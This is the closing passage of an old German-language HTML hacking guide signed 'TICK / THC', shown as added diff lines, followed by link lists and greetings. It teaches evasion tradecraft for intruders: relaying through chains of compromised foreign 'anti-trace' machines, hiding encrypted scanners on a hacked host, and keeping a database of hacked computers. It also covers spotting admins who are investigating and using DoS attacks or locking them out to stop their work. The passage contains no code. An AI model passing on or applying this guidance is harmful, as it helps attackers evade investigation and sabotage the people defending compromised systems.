+haben, keine kompromitierenden Files hinterlassen.</font>
+<br><font color="#000000">Mit Sicherheit koennte noch einiges verbessert
+werden, versuch's und entwickel so deinen eigenen Style.</font>
+<p>Lege dir ein Art Datenbank mit allen noetigen Information ueber deine
+gehackten Rechner an sonst verlierst du irgendwann den Ueberblick (natuerlich
+encrypted).
+<br>&nbsp;
+<p><a NAME="a9"></a>
+<h3>
+<font color="#993399">Persoenliche Sicherheit</font></h3>
+Es ist natuerlich klar, dass du deine Daten auf der HD mit&nbsp; CFS&nbsp;
+bzw.&nbsp; SFS&nbsp; und deine E-Mail mit&nbsp; PGP&nbsp; verschluesselts,
+Ramdisks benutzt, Backups deiner wichtigsten Daten auf Tape/CDs nicht zuhause
+lagerst, deinen realen Namen nicht weitergibst usw... dieser Kram soll
+nicht Bestandteil dieses Abschnitts sein, ich moechte lieber ueber eine
+sichere Konfiguration sprechen, die dich beim Hacken schuetzt und vorwarnt
+wenn dich jemand verfolgt.
+<p>Ich werde hier die Methode beschreiben, die ich persoenlich anwende.
+<center><img SRC="test.jpg" height=546 width=800></center>
+Als Einwahltpunkt dient mir eine grosse Uni mit vielen Usern oder ein grosser
+ISP. Ich verwende <i>PPP</i> statt normale Terminalprogramme um eine groessere
+Kontrolle ueber meine Verbindung zu haben und weil es vom Vorteil ist ueber
+eine Leitung mehrere Sessions - Telnet, FTP - laufen zu lassen.
+<br>Ein kleinerer Rechner dient mir als Firewall und Router, ich baue die
+<i>PPP</i>-Verbindung
+zu meinem Einwahlpunkt auf und ueberwache alle eingehenden Pakete. Desweiteren
+stelle ich mit <i>SSH</i> eine Connection zum Einwahlrechner her um periodisch
+alle eingeloggten User und Netzwerkverbindungen zu verfolgen (was natuerlich
+nur funktioniert, wenn der Einwahlrechner eine Unix-Maschine ist und kein
+Terminalserver o.ae.). Es ist sehr interessant zu sehen, was ein Admin
+alles macht, wenn er merkt, dass etwas nicht mit rechten Dingen auf seiner
+Maschine vorgeht. Sobald mir solche Sondierungen/Untersuchungen auffallen
+breche ich die Verbindung sofort ab, falls ich mich aber gerade in einer
+kritischen Lage befinde muss ich DoS-Attacken benutzen oder den Admin aussperren
+um seine Arbeit zu verlangsamen bzw. zu verhindern. Auf dem Einwahlrechner
+ist es nicht noetig seine Gegenwart zu verschleiern, es ist besser unauffaellig
+in der Masse unterzutauchen als irgenwelche Logs zu manipulieren.
+<br>Der zweite, groessere Rechner ist meine Workstation, von hier aus baue
+ich eine <i>SSH</i>-Verbindung zum ersten <i>Anti-Trace Rechner</i> auf.
+Dieser <i>Anti-Trace Rechner </i>wechselt regelmaessig, liegt im Ausland
+und ich hab' volle Kontrolle ueber ihn. Von hier aus gehe ich ueber ein
+weiteren <i>Anti-Trace Rechner </i>zu meinem <i>Hacking-Rechner</i>; auch
+hier habe ich natuerlich &acute;root&acute;-Rechte, der zweite <i>AT-Rechner
+</i>ist
+nur ein einfacher <i>TCP-Relay</i>, damit erspare ich mir den Stress mit
+den Logfiles etc. Vom <i>Hacking-Rechner </i>gehe ich in sehr sichere Domains
+oder hacke von hier aus neue Netzwerke (es existieren selbstverstaendlich
+mehrere dieser Rechner, die zudem unregelmaessig gewechselt werden). Zum
+Scannen benutze ich einen eigens dafuer gehackten Rechner, die Scanner
+sind hier alle gut versteckt und zusaetzlich mit <i>3DES</i> verschluesselt.
+<p>Die verschluesselten <i>SSH </i>Verbindung sind noetig, damit die Admins/Bullen/Geheimdienste
+nicht meine Aktivitaeten am Einwahlpunkt (oder sonstwo) mitschneiden koennen.
+<p>Falls du nur einen Rechner zur Verfuehgung hast, dann kannst du dich
+natuerlich auch mit der Firewall von Linux/FreeBSD/OpenBSD auf deiner Workstation
+schuetzen. Es ist jedoch kompfortabler die Verbindung ueber einen speziellen
+Computer zu beobachten (ich weiss nicht inwiefern Linux und Co. einen zweiten
+Monitor an einem Rechner unterschtuetzt).
+<p>Zusaetzlich solltest du noch deinen Kernel patchen, damit er dir mehr
+informationen ueber eingehende Pakete liefert, somit bist du in der Lage
+die Herkunft (leider nicht immer;) von DoS Attacken, Source-Routing Angriffe,
+Traceroutes etc. zu erkennen.
+<br>&nbsp;
+<p><a NAME="a10"></a>
+<h3>
+<font color="#993399">Letzte Worte</font></h3>
+<font color="#000000">Ich hoffe, der Text konnte dir einen guten Ueberblick
+zum Thema Internet-Hacking geben.</font>
+<br><font color="#000000">Vielleicht ist dir aufgefallen, dass ich nicht
+die Verwendung von irgnedwelchen Exploits und Hacking-Tools beschrieben
+habe, das hat einen einfachen Grund, undzwar moechte ich keine Skript Kiddies
+heranzuechten, sondern nur einen leichten Einstieg fuer die wirklich interessierten
+Leute unter euch bieten - warum das Rad staendig neu erfinden!?</font>
+<br><font color="#000000">Und vergiss nicht: Hacken ist nicht der Nexus...
+denk' auch mal an's nicht digitale Leben - Frauen, Parties, ...</font>
+<br>&nbsp;
+<br>&nbsp;
+<h3>
+<a NAME="a10"></a></h3>
+
+<h3>
+<font color="#993399">Wichtige Links</font></h3>
+&nbsp;<a href="http://www.false.com/security">http://www.false.com/security</a>
+<br>&nbsp;<a href="http://www.insecurity.org/nmap">http://www.insecurity.org/nmap</a>
+<br>&nbsp;<b><a href="http://www.thc.org">http://www.thc.org</a></b>
+[die THC Hauptseite - unbedingt besuchen! ;-) Hier gibts auch die Updates
+fuer diesen Artikel]
+<br>&nbsp;<a href="http://www.secunet.com">http://www.secunet.com</a>
+<br>&nbsp;<a href="http://geek-girl.com/bugtraq">http://geek-girl.com/bugtraq</a>
+<br>&nbsp;<a href="http://rootshell.com">http://rootshell.com</a>
+<br>&nbsp;<a href="http://rootshell.com/doc">http://rootshell.com/doc</a>
+<br>&nbsp;<a href="http://www.sparc.com/charles/security.html">http://www.sparc.com/charles/security.html</a>
+<br>&nbsp;<a href="http://command.com.inter.net/~sod/">http://command.com.inter.net/~sod/</a>
+<br>&nbsp;<a href="http://www.phrack.com">http://www.phrack.com</a>
+<br>&nbsp;<a href="http://www.cs.purdue.edu/coast/">http://www.cs.purdue.edu/coast/</a>
+<br>&nbsp;<a href="http://www.pilot.net/security-guide.html">http://www.pilot.net/security-guide.html</a>
+<br>&nbsp;<a href="http://underground.org/">http://underground.org/</a>
+<br>&nbsp;<a href="http://www.l0pht.com">http://www.l0pht.com</a>
+<br>&nbsp;<a href="http://www.infonexus.com">http://www.infonexus.com/~deamon9</a>
+<br>&nbsp;<a href="http://www.cert.org">http://www.cert.org</a>
+<br>&nbsp;<a href="http://www.cert.dfn.de">http://www.cert.dfn.de</a>
+<br><a href="ftp://ftp.blip.pp.se/pub/cracking">&nbsp;ftp.blib.pp.se/pub/cracking</a>&nbsp;
+alot of tools and exploits!!!!
+<p>
+<hr WIDTH="100%">
+<br>&nbsp;
+<center>
+<h3>
+<b><blink><font size=+2>This is the End my Friend</font></blink></b></h3></center>
+
+<center>
+<p><br><b>All my Love to:</b>
+<br><font color="#3333FF"><font size=+1>My lovely Girl - You are my Sun!</font></font>
+<br>my best Friend #1
+<br>my best Friend #2
+<br>Sir Fredde Richard - "Two Bud and a chessgame, please."
+<p><b>Greets to:</b>
+<br>van Hauser
+<br>Fr00dy
+<br>Salpeter
+<br>The Lord o/t Hardschool - I hope you are not in trouble.
+<br>stanly
+<br>Zonk
+<br>THC/ADM/dEEP
+<br>JEVER, Budweiser-, Paulaner- and Sol-Brewery - Stop selling your beer!
+I&acute;m addicted! ;)
+<p><b>Hate goes to:</b>
+<br>all politicans
+<br>all religions of this fucking world
+<br>all clocks - I'm the real TICK!</center>
+
+<p><br>
+<center>
+<h1>
+<font color="#33FF33"><font size=+4>TICK / THC</font></font></h1></center>
+
+</body>
+</html>
